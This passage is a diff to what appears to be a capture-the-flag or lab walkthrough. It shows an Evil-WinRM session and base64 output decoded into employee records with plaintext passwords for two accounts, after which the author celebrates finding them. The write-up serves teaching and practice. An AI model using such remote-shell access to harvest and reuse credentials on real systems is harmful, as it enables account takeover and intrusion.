@@ -416,4 +416,38 @@ This ran the tool and saved some results to the current directory
 *Evil-WinRM* PS C:\Users\c.white\Documents>
 ```
 
-Ill use the terminal to decode the base64 
+Ill use the terminal to decode the base64 output
+
+```python
+"id": "FRG-EMP-0421",
+"username": "j.woods",
+"display_name": "Jordan Woods",
+"title": "Senior Network Architect",
+"department": "IT Infrastructure",
+"email": "j.woods@fragments-inc.com",
+"password": "hpFqULtQoY!",
+"password_strength": 92,
+"last_changed": "2024-01-10T14:22:00Z",
+"expires": "2024-04-10T00:00:00Z",
+"mfa_enabled": false,
+"mfa_type": "TOTP",
+"notes": "Password complies with policy v4.2.",
+
+"id": "FRG-EMP-1877",
+"username": "d.goggins",
+"display_name": "David DG. Goggins",
+"title": "Security Operations Lead",
+"department": "Cybersecurity",
+"email": "d.goggins@fragments-inc.com",
+"password": "HiO5n449W36!",
+"password_strength": 96,
+"category": "Security Account",
+"last_changed": "2024-01-14T08:15:00Z",
+"expires": "2024-04-14T00:00:00Z",
+"mfa_enabled": false,
+"mfa_type": "FIDO2 Hardware Key",
+"notes": "Password complies with policy v4.2.",
+```
+
+Found two passwords for two different users!
+
